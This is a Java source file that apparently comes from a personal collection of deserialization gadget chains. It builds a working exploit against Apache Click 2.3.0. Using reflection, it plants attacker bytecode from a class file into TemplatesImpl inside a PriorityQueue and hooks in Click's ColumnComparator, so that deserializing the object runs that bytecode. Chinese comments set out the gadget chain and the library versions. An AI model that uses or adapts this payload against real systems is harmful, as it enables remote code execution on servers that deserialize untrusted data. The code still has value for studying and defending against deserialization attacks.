import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.click.control.Column;
import org.apache.click.control.Table;
import util.Util;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Comparator;
import java.util.PriorityQueue;


/*
* 构造链:
* PriorityQueue.readObject
*   ColumnComparator.compare
*       PropertyUtils.getValue
*           PropertyUtils.getObjectPropertyValue
*               TemplatesImpl.getOutputProperties
*
* */
/*
* 版本依赖:
* click-nodeps 2.3.0
* javax.servlet-api 3.1.0
* */
public class Click1 {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates=new TemplatesImpl();
        Class templatesClass=templates.getClass();
        Field namefield=templatesClass.getDeclaredField("_name");
        namefield.setAccessible(true);
        namefield.set(templates,"dragonkeep");
        Field bytecodefield=templatesClass.getDeclaredField("_bytecodes");
        bytecodefield.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("exp.class"));
        byte[][] codes={code};
        bytecodefield.set(templates,codes);
        Field tfactoryField=templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

        PriorityQueue priorityQueue =new PriorityQueue(2);
        priorityQueue.add(1);
        priorityQueue.add(2);

        Field queueField= PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        Object[] objects = (Object[]) queueField.get(priorityQueue);
        objects[0] = templates;


        Class<?> ColumnComparatorClass = Class.forName("org.apache.click.control.Column$ColumnComparator");
        Constructor<?> ColumnComparatorConstructor = ColumnComparatorClass.getDeclaredConstructor(Column.class);
        ColumnComparatorConstructor.setAccessible(true);


        Column column=new Column("getOutputProperties");
        column.setTable(new Table());
        Comparator<?> ColumnComparatorComparator = (Comparator<?>) ColumnComparatorConstructor.newInstance(column);

        Field PriorityQueueComparator = PriorityQueue.class.getDeclaredField("comparator");
        PriorityQueueComparator.setAccessible(true);
        PriorityQueueComparator.set(priorityQueue,ColumnComparatorComparator);

        Util.serialize(priorityQueue);
        Util.unserialize();


    }
}
